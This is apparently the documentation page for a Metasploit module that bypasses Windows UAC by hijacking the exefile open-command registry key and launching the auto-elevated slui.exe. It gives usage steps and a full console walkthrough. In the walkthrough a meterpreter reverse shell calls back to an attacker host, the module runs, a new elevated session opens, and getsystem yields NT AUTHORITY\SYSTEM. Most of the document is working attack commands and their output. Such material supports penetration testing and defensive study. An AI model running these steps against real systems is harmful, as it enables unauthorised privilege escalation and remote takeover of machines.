## Intro

  This module will bypass UAC on Windows 8-10 by hijacking a special key in the Registry under
  the Current User hive, and inserting a custom command that will get invoked when
  any binary (.exe) application is launched. But slui.exe is an auto-elevated binary that is
  vulnerable to file handler hijacking. When we run slui.exe with changed Registry key
  (HKCU:\Software\Classes\exefile\shell\open\command), it will run our custom command as Admin
  instead of slui.exe.

  The module modifies the registry in order for this exploit to work. The modification is
  reverted once the exploitation attempt has finished.
	
  The module does not require the architecture of the payload to match the OS. If
  specifying EXE::Custom your DLL should call ExitProcess() after starting the
  payload in a different process.

## Usage
	
  1. First we need to obtain a session on the target system.
  2. Load module: `use exploit/windows/local/bypassuac_sluihijack`
  3. Set the `payload`: `set payload windows/x64/meterpreter/reverse_tcp`
  4. If an existing handler is configured to receive the elevated session,
  then the module's handler should be disabled: `set DisablePayloadHandler true`.
  5. Configure the `payload`.
  6. `Exploit` it.

## Scenario

```
msf exploit(multi/handler) > 
[*] https://192.168.0.30:443 handling request from 192.168.0.33; (UUID: d4iywkip) Encoded stage with x86/shikata_ga_nai
[*] https://192.168.0.30:443 handling request from 192.168.0.33; (UUID: d4iywkip) Staging x86 payload (180854 bytes) ...
[*] Meterpreter session 1 opened (192.168.0.30:443 -> 192.168.0.33:49875) at 2018-04-07 18:33:11 +0200

msf exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  WIN10-01\user01 @ WIN10-01  192.168.0.30:443 -> 192.168.0.33:49875 (192.168.0.33)

msf exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > sysinfo 
Computer        : WIN10-01
OS              : Windows 10 (Build 16299).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid 
Server username: WIN10-01\user01
meterpreter > getprivs 

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > background 
[*] Backgrounding session 1...
msf exploit(multi/handler) > use exploit/windows/local/bypassuac_sluihijack
msf exploit(windows/local/bypassuac_sluihijack) > show targets 

Exploit targets:

   Id  Name
   --  ----
   0   Windows x86
   1   Windows x64


msf exploit(windows/local/bypassuac_sluihijack) > set target 1
target => 1
msf exploit(windows/local/bypassuac_sluihijack) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf exploit(windows/local/bypassuac_sluihijack) > set session 1
session => 1
msf exploit(windows/local/bypassuac_sluihijack) > set LHOST 192.168.0.30
LHOST => 192.168.0.30
msf exploit(windows/local/bypassuac_sluihijack) > exploit 

[*] Started HTTPS reverse handler on https://192.168.0.30:8443
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\Sysnative\cmd.exe /c powershell Start-Process C:\Windows\System32\slui.exe -Verb runas
[*] https://192.168.0.30:8443 handling request from 192.168.0.33; (UUID: znqja6ua) Staging x64 payload (207449 bytes) ...
[*] Meterpreter session 2 opened (192.168.0.30:8443 -> 192.168.0.33:49881) at 2018-04-07 18:34:39 +0200
[*] Cleaining up registry keys ...

meterpreter > getprivs 

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```
